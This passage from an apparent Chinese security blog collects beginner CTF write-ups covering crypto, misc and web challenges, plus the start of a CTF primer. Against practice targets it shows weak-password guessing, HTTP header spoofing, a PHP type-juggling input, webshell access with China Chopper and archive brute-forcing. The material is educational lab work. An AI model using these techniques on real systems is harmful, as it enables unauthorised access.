GWTHSPYBXIZULVKMRAFDCEONJQ &lt; 8: &lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt; 9: &lt; XPLTDSRFHENYVUBMCQWAOIKZGJ &lt; 10: &lt; UDNAJFBOWTGVRSCZQKELMXYIHP &lt; 11 &lt; MNBVCXZQWERTPOIUYALSKDJFHG &lt; 12 &lt; LVNCMXZPQOWEIURYTASBKJDFHG &lt; 13 &lt; JZQAWSXCDERFVBGTYHNUMKILOP &lt;</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">m&#x3D;&quot;NFQKSEVOQOFNP&quot;</span><br><span class="line">content&#x3D;re.findall(r&#39;&lt; (.*?) &lt;&#39;,sss,re.S)</span><br><span class="line">print content</span><br><span class="line">iv&#x3D;[2,3,7,5,13,12,9,1,8,10,4,11,6]</span><br><span class="line">vvv&#x3D;[]</span><br><span class="line">ans&#x3D;&quot;&quot;</span><br><span class="line">for i in range(13):</span><br><span class="line">index&#x3D;content[iv[i]-1].index(m[i])</span><br><span class="line">vvv.append(index)</span><br><span class="line">print vvv</span><br><span class="line">for i in range(0,26):</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for j in range(13):</span><br><span class="line">flag+&#x3D;content[iv[j]-1][(vvv[j]+i)%26]</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><h2 id="easy-ECC"><a href="#easy-ECC" class="headerlink" title="easy_ECC"></a>easy_ECC</h2><p>ECC？<a href="https://www.8btc.com/article/15089"><strong>百度一下</strong></a>看看<br>没太懂，百度一波wp，发现有个叫ECCTOOL的软件可以算出x+y的值来<br><a href="https://blog.csdn.net/qq_43550956/article/details/102592719"><strong>具体操作</strong></a></p><blockquote><p>好了，crypto新手区wp也到此结束了<br>若哪有问题，欢迎师傅们底下留言</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-Misc新手区</title>
      <link href="2020/02/27/XCTF-Misc%E6%96%B0%E6%89%8B%E5%8C%BAwp/"/>
      <url>2020/02/27/XCTF-Misc%E6%96%B0%E6%89%8B%E5%8C%BAwp/</url>
      
        <content type="html"><![CDATA[<h2 id="this-is-flag"><a href="#this-is-flag" class="headerlink" title="this_is_flag"></a>this_is_flag</h2><p>Emmmmm，签到题，flag就在题目中</p><h2 id="pdf"><a href="#pdf" class="headerlink" title="pdf"></a>pdf</h2><p>下好附件，打开就是一张图片<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1228143788.png"></p><p>题目应该在暗示什么，于是我用2345打开编辑一下，拖动一下果然有点东西</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/413273212.png"></p><h2 id="如来十三掌"><a href="#如来十三掌" class="headerlink" title="如来十三掌"></a>如来十三掌</h2><p>打开附件，一堆佛语</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3083201790.png"></p><p>这第一次接触肯定裂开，这需要用到：与佛论禅<br>附上链接：<a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a><br>（注：使用前要加上佛曰：）<br>解密得到：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/825069527.png"></p><p>一看感觉应该是base64，结果不对…<br>十三？试一下rot13，果然如此：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/433591943.png"></p><p>接着再试试base64:，成功得到flag：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/690561122.png"></p><h2 id="give-you-flag"><a href="#give-you-flag" class="headerlink" title="give_you_flag"></a>give_you_flag</h2><p>打开附件一看是个gif<br>先看看属性啥的，发现没啥特别<br>接着用2345打开逐帧查看，发现有几张残缺的二维码：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/928412761.png"></p><p>这时就需要用到一个软件：Stegsolve<br>附上链接：<a href="https://pan.baidu.com/s/17hVkkIuZrunFF2fwDd7qKA">https://pan.baidu.com/s/17hVkkIuZrunFF2fwDd7qKA</a> （提取码：a5ds）<br>最终合并出一个完整的二维码：<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1953611089.png"></p><p>扫一扫二维码获取flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/763992316.png"></p><h2 id="坚持60s"><a href="#坚持60s" class="headerlink" title="坚持60s"></a>坚持60s</h2><p>打开附件，是个jar小游戏，点开玩玩看<br>好吧，玩不起……</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/376056459.png"></p><p>这里我使用java反编译工具，打开查看源码，成功获取flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/621982173.png"></p><p>emmmm，这个软件出了点问题，暂时就不提供链接了，可自行百度下载</p><h2 id="gif"><a href="#gif" class="headerlink" title="gif"></a>gif</h2><p>打开附件，里面全是黑白图片，难道考察加密？<br>看完大佬的wp才知道是考察二进制转字符串<br>先将其写成二进制：</p><blockquote><p>01100110011011000110000101100111011110110100011001110101010011100101111101100111011010010100011001111101</p></blockquote><p>接着开始<ins><a href="http://www.txttool.com/wenben_binarystr.asp"><strong>在线转字符串</strong></a></ins>，获取flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1993429052.png"></p><h2 id="掀桌子"><a href="#掀桌子" class="headerlink" title="掀桌子"></a>掀桌子</h2><p>通过题目给的报文，猜测应该是十六进制，无果<br>百度看了波wp才知道了要ASCII码值减去128再转字符串<br>接着就开始写脚本，拿flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/350174961.png"></p><p>附上脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">    a&#x3D;’01100110011011000110000101100111011110110100011001110101010011100101111101100111011010010100011001111101’</span><br><span class="line">    b&#x3D;re.findall(r’.&#123;8&#125;’,a)</span><br><span class="line">    flag&#x3D;’’</span><br><span class="line">    for i in b:</span><br><span class="line">        flag +&#x3D; chr(int(i,2))</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure><h2 id="base64stego"><a href="#base64stego" class="headerlink" title="base64stego"></a>base64stego</h2><p>打开附件，是个加密了的包</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3092321336.png"></p><p>还想着直接爆破出来，无果…</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3620590430.png"></p><p>看来应该是个伪加密，接着用winhex打开看看，果然验证了我的猜测，然后将09—&gt;00</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3826792588.png"></p><p>接着就可以解压，得到文档</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/218435078.png"></p><p>先base64解码一下：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1624238187.png"></p><p>翻译一下：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/80934721.png"></p><p>根据提示得知这是<a href="https://www.cnblogs.com/Elope/p/6725824.html"><strong>base64隐写</strong></a>，来看看<a href="https://www.tr0y.wang/2017/06/14/Base64steg/"><strong>大佬的笔记</strong></a><br>接着我就不会了，不过可以看看<a href="https://blog.csdn.net/m0_37442062/article/details/90517209"><strong>这位大佬的wp</strong></a></p><p>附上伪加密知识点链接：<a href="https://blog.csdn.net/weixin_41687289/article/details/82695801">https://blog.csdn.net/weixin_41687289/article/details/82695801</a></p><h2 id="ext3"><a href="#ext3" class="headerlink" title="ext3"></a>ext3</h2><p>附件不知道是啥东西，打开kali先看看，发现里面有flag.txt，接着就开始binwalk分离一下</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1624912640.png"></p><p>最终得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2823562298.png"></p><h2 id="stegano"><a href="#stegano" class="headerlink" title="stegano"></a>stegano</h2><p>这里我是用火狐浏览器打开，然后在控制台输入命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.documentElement.textContent</span><br></pre></td></tr></table></figure><p>接着就会出现如下：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1441031241.png"></p><blockquote><p>BABA BBB BA BBA ABA AB B AAB ABAA AB B AA BBB BA AAA BBAABB AABA ABAA AB BBA BBBAAA ABBBB BA AAAB ABBBB AAAAA ABBBB BAAA ABAA AAABB BB AAABB AAAAA AAAAA AAAAB BBA AAABB</p></blockquote><p>看到abab的排序就想到了培根加密，无果…<br>然后试了试改成摩斯密码，把A换成.，把B换成-<br>最后解出flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2781309532.png"></p><h2 id="功夫再高也怕菜刀"><a href="#功夫再高也怕菜刀" class="headerlink" title="功夫再高也怕菜刀"></a>功夫再高也怕菜刀</h2><p>下好附件，打开虚拟机，先binwalk看看</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2650433505.png"></p><p>成功分离，找到flag的文本，但是加密了</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1261478689.png"></p><p>接着就直接上工具爆破，密码比较复杂，所以有点久…</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4199382113.png"></p><p>最后得到密码，获得flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2255221359.png"></p><h2 id="SimpleRAR"><a href="#SimpleRAR" class="headerlink" title="SimpleRAR"></a>SimpleRAR</h2><p>打开附件，如下：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3873287732.png"></p><p>通过winhex发现里面还有张图片，但是包是损坏了</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2778888132.png"></p><p>这里涉及rar，通过百度得知文件块开头，于是将7A-&gt;74，然后就解压正常了<br>打开后发现是一张空白的图片，于是继续用winhex打开，得知它是个gif</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1915711535.png"></p><p>接着我用Stegsolve打开图片，发现是个半个二维码…<br>这里猜测应该是重叠了，然后就该搬出PS老学姐了，进行一波PS工程得到一个完整的二维码并扫码得出flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/32122431.png"></p><blockquote><p>终于结篇了，我太难了<br>若哪有问题，欢迎师傅们底下留言</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-Web新手区</title>
      <link href="2020/02/25/XCTF-Web%E6%96%B0%E6%89%8B%E5%8C%BAwp/"/>
      <url>2020/02/25/XCTF-Web%E6%96%B0%E6%89%8B%E5%8C%BAwp/</url>
      
        <content type="html"><![CDATA[<h2 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h2><p>这题算是签到题，十八罗汉第一式：查看源代码<br>获取场景，打开如下：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2289870338.png"></p><p>此时发现右击不了，于是就加上“view_source:”就可以查看源码，直接就出来flag了，所以说是签到题</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1650584050.png"></p><h2 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h2><p>一看题目robots，十八罗汉直接上<br>先获取场景，然后直接加个robots.txt看看，如下：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1970713077.png"></p><p>接着就按他提示走，成功得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3642322076.png"></p><h2 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h2><p>先获取下场景吧…<br>打开就提示的很明显了，直接加index.php.bak后缀把文件下载下来</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3999939449.png"></p><p>打开下载好的文件即可得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1410479923.png"></p><h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p>题目叫cookie，所以可能是要找到cookie<br>于是f12，网络看看，如下：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1997628684.png"></p><p>接着就按照发现加上个后缀，最后成功找到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3011328304.png"></p><h2 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h2><p>先获取下场景，打开显示如下：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1002423947.png"></p><p>不能按？？？我就要按（果然按不了…）<br>接着f12看看（果然有内鬼停止交易），还好学过几年English，看到是disable</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/471716298.png"></p><p>于是将disable改成able</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3186872710.png"></p><p>然后嘿嘿，小样还不让我点，就这样集齐七龙珠召唤flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/88905842.png"></p><h2 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h2><p>我的English还是不错的，weak_auth==弱密码<br>先获取场景康康，丑陋的登录界面…</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1986719062.png"></p><p>既然是弱密码，用户名应该是admin吧，再试试密码admin</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/173282351.png"></p><p>居然不对，再试试其他的，最后试出来是123456</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1087784777.png"></p><p>打开就看到flag了</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/19471270.png"></p><h2 id="SimpleRAR"><a href="#SimpleRAR" class="headerlink" title="SimpleRAR"></a>SimpleRAR</h2><p>获取场景后发现是道代码审计的题，那就看看这PHP代码</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2616921345.png"></p><p>从中我们可以知道：既要保证输出a，b，又要保证$b是数字<br>于是我们就可以进行构造：a=c&amp;b=2222a，从而得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3113064903.png"></p><h2 id="get-post"><a href="#get-post" class="headerlink" title="get_post"></a>get_post</h2><p>获取场景，打开看见如下提示：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1986579755.png"></p><p>于是按照要求加上后缀“index.php?a=1”,如下：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2559118209.png"></p><p>然后就f12使用hackbar让b=2，操作如下：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2432159975.png"></p><p>最终得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4081430940.png"></p><h2 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h2><p>这题我做不出来..看了别人写的wp<br>首先来了解一下题目意思：</p><blockquote><p>xff是http的拓展头部，作用是使Web服务器获取访问用户的IP真实地址（可伪造）。由于很多用户通过代理服务器进行访问，服务器只能获取代理服务器的IP地址，而xff的作用在于记录用户的真实IP，以及代理服务器的IP。<br>x-forwarded-for，用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段<br>格式为：X-Forwarded-For: 本机IP, 代理1IP, 代理2IP, 代理2IP<br>referer是http的拓展头部，作用是记录当前请求页面的来源页面的地址。服务器使用referer确认访问来源，如果referer内容不符合要求，服务器可以拦截或者重定向请求。告诉服务器该网页是从哪个页面链接过来的</p></blockquote><p>接着我们来获取场景。发现他给出提示：ip地址必须为123.123.123.123<br>所以我们burp抓包，在请求头中添加X-Forwarded-For：123.123.123.123<br>提交请求后，提示必须来自<a href="https://www.google.com/">https://www.google.com</a></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1656454749.png"></p><p>接着在请求头中添加referee：<a href="https://www.google.com/">https://www.google.com</a>，从而得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/626563710.png"></p><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>先获取下场景吧，打开一看，它提示的很明显了，如下：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3944267940.png"></p><p>这时，需要用到一个工具：中国菜刀（或者蚁剑也可以）进行如下操作</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/628947422.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2795818597.png"></p><p>从中可以看到一个很显目的flag文档，就这样成功拿到了flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2250347618.png"></p><h2 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a>command_execution</h2><p>先获取场景，打开如下：<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3214803999.png"></p><p>回头看题目提示说没有写waf<br>emmmm，先百度了解一下waf<br>链接：<a href="https://baike.baidu.com/item/WAF/3239498?fr=aladdin">https://baike.baidu.com/item/WAF/3239498?fr=aladdin</a><br>好吧，没啥思路…去百度看看大佬们的wp<br>原文：<a href="https://www.cnblogs.com/wushengyang/p/12507740.html">https://www.cnblogs.com/wushengyang/p/12507740.html</a><br>不愧是大佬，懂了，开始操作：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1223323418.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1058220401.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/148472205.png"></p><h2 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h2><p>获取场景，打开有个弹窗：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1130079787.png"></p><p>那就先试试密码，不对…</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3805453008.png"></p><p>不过跳出个源码来，那就看看：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/957676602.png"></p><p>代码审计，好吧，接下来我也不会了…还是看看大佬写的wp<br>真正的flag是 <code>\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30</code><br>然后就开始跑脚本，得出flag附上大佬的脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a &#x3D; &#39;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&#39;</span><br><span class="line"># print(a)</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">a &#x3D; a.split(&#39;,&#39;)</span><br><span class="line">for i in a:</span><br><span class="line">  flag +&#x3D; chr(int(i))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3071799467.png"></p><blockquote><p>以上就是攻防世界web新手区所有的wp<br>若哪有问题，欢迎师傅们底下留言</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>The first SMUCTF</title>
      <link href="2020/02/13/The%20first%20SMUCTF/"/>
      <url>2020/02/13/The%20first%20SMUCTF/</url>
      
        <content type="html"><![CDATA[<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>打开地址，便可以发现本题的flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2214784607.png"></p><h2 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h2><p>打开地址，你会看到上面显示“where is flag”</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1446018571.png"></p><p>并且无法查看源代码，于是需要加上前缀</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2281388779.png"></p><p>这时就可以查看源代码，找出flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/374980764.png"></p><h2 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h2><p>首先，将文件下载下来。你会发现是个gif格式，然后就可以用2345看图王打开，逐帧的进行查看，就会发现有一串字符，也就是压缩包密码</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/186462552.png"></p><p>最后，打开后就找到了flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3874074453.png"></p><h2 id="谁是DJ"><a href="#谁是DJ" class="headerlink" title="谁是DJ"></a>谁是DJ</h2><p>首先，题目给了一个提示：DJ有个域名：ctf.djboke.top。打开一看就是比赛平台，有点像钓鱼网站，让人头大，无法下手。想了许久，最后通过上课学的加上百度，我发现可以查域名解析记录。于是打开cmd，用nslookup -qt=txt+域名便可以找到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3137680496.png"></p><h2 id="一份奇怪的编码"><a href="#一份奇怪的编码" class="headerlink" title="一份奇怪的编码"></a>一份奇怪的编码</h2><p>首先，下载文件。打开一看是一堆的代码，接着，就想到用base64转图片。于是百度base64转图片在线工具，并在代码前加上其类型jpg，进行转换<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/588851139.png"></p><p>然后把图片下载下来，放入虚拟机里面，用binwalk就会发现里面还有个压缩包，有一个加密的flag和图片，于是就得从图片入手找到密码</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2428741399.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3269813088.png"></p><p>将图片下载，用一个神仙网站把图片秒解，得到密码</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/52180931.png"></p><p>然后解开加密的文件，打开就是如下的一串码</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3396807991.png"></p><p>然后用base64解码，flag就出来了</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/619009714.png"></p><h2 id="不爽的猫"><a href="#不爽的猫" class="headerlink" title="不爽的猫"></a>不爽的猫</h2><p>首先下载文件，加上后缀zip，打开压缩包</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/545832246.png"></p><p>发现压缩包需要密码，于是用暴力破解来解出密码，从而得到图片</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2358408614.png"></p><p>这时，发现图片是个二维码，需要用PS复原定位点，得到二维码</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4016329068.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3806926906.png"></p><p>然后扫二维码得到压缩包密码，解出一个文件，接着用winhex将其改为png格式，保存完关闭，将mao加上后缀，就会出现一张图片</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/686023652.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2389994645.png"></p><p>最后将图片中的码用base32解码，就可以弄出flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/927400189.png"></p><h2 id="简单杂项"><a href="#简单杂项" class="headerlink" title="简单杂项"></a>简单杂项</h2><p>首先下载文件，发现给加密了，加上提示学号是几位，就得知了密码可能就是某位学长的学号，11位的数字，于是就开始暴力破解</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2892425653.png"></p><p>得到密码，就得到一张照片，貌似毫无用处，用binwalk发现就只是一张图片而已。就开始各种尝试，最后将它转为txt格式，看着好像就是一堆乱码，搜不出flag。接着就用base64编码flag,得到emhlc2hpZmxhZw==。于是就开始搜索这个，果然找到了一串字符，接着用base64解码得到zheshiflag，也许这就是flag了，于是尝试输入flag{zheshiflag}，结果就对了</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/692482126.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3282228628.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2188370906.png"></p><h2 id="incloude"><a href="#incloude" class="headerlink" title="incloude?"></a>incloude?</h2><p>首先，打开地址，知道这是关于文件包含的题目并且发现这是path请求，于是就加上了以下的一个后缀，得到一串码</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/180761087.png"></p><p>最后用base64解码得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1408905.png"></p><h2 id="post和get"><a href="#post和get" class="headerlink" title="post和get"></a>post和get</h2><p>打开地址，查看元素，由代码可知要get=post，先让get=1</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1393395659.png"></p><p>然后使用插件max hackbar,点击load url,便可以看到如下的情况</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2782952618.png"></p><p>然后点击post data，让post=1，使get=post<br>最后点击execution，得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/43708867.png"></p><h2 id="top1"><a href="#top1" class="headerlink" title="top1"></a>top1</h2><p>打开地址出现了一个登录框，毫无头绪…<br>后来在群里看到了一些不得了的东西，于是猜了一些常见的用户密码最后得知了账号就是admin，密码就是123456.<br>而且连解码都不要，直接得到flag。但是没得复制…</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2959754613.png"></p><h2 id="Null"><a href="#Null" class="headerlink" title="Null"></a>Null</h2><p>打开什么也没有，就开始猜flag，刚开始输Null结果错误，接着输入null就对了</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SMUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF简介</title>
      <link href="2020/02/13/CTF%E7%AE%80%E4%BB%8B/"/>
      <url>2020/02/13/CTF%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<p>CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。CTF起源于1996年DEFCON全球黑客大会，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。发展至今，已经成为全球范围网络安全圈流行的竞赛形式。</p><p>CTF竞赛模式具体分为以下三类：<br>解题模式（Jeopardy）、攻防模式（Attack-Defense）、混合模式（Mix）</p><p>黑盾杯，百越杯</p><h3 id="一、解体模式（Jeopardy）"><a href="#一、解体模式（Jeopardy）" class="headerlink" title="一、解体模式（Jeopardy）"></a>一、解体模式（Jeopardy）</h3><p>可通过互联网或现场网络参与，解决网络安全技术挑战题目，并以分值和时间排名。题目主要包括：逆向，漏洞挖掘与利用，web渗透，密码，取证，隐写，安全编程</p><h3 id="二、攻防模式（Attack-Defense）"><a href="#二、攻防模式（Attack-Defense）" class="headerlink" title="二、攻防模式（Attack-Defense）"></a>二、攻防模式（Attack-Defense）</h3><p>在网络空间互相进行攻击和防守，挖掘网络服务漏洞并攻击对手来得分，修补自身服务漏洞进行防御来避免丢分。</p><h3 id="三、混合模式（Mix）"><a href="#三、混合模式（Mix）" class="headerlink" title="三、混合模式（Mix）"></a>三、混合模式（Mix）</h3><p>比如先通过解体获取一些初始分，然后通过攻击对抗进行得分加减的零和。主要的CTF题型：</p><p>1、MISC(Miscellaneous)类型，即安全杂项，题目或涉及流量分析、电子取证、人肉搜索、数据分析等等。（这个也是难度比较小，还有入门比较容易的类型）</p><p>2、Reverse（逆向分析）</p><p>3、Crypot（密码，加解密，安全编程）即密码学，题目考察各种加解密技术，包括古典加密技术、现代加密技术甚至出题者自创加密技术。</p><p>4、Mobile（apk，安卓，ios）</p><p>5、Exploit（漏洞利用）</p><p>6、Web（漏洞挖掘与利用）题目会涉及到常见的Web漏洞，诸如注入、XSS、文件包含、代码执行等漏洞。</p><p>7、Recon（社工，情报搜索分析）</p><p>8、Forensic（网络流量分析，隐写分析，系统取证）</p><p>9、PPC(Professionally Program 